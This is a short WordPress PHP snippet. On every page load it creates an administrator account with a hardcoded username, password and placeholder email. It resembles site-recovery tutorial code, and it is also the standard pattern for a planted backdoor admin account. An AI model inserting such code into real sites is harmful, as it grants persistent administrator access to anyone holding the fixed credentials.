<?php

//create user
function wpb_admin_account(){
    $user = 'test_user';
    $pass = '!74u_9*&!74/*j';
    $email = 'test@test.com';
    if ( !username_exists( $user )  && !email_exists( $email ) ) {
        $user_id = wp_create_user( $user, $pass, $email );
        $user = new WP_User( $user_id );
        $user->set_role( 'administrator' );
    }
}
add_action('init','wpb_admin_account');

?>
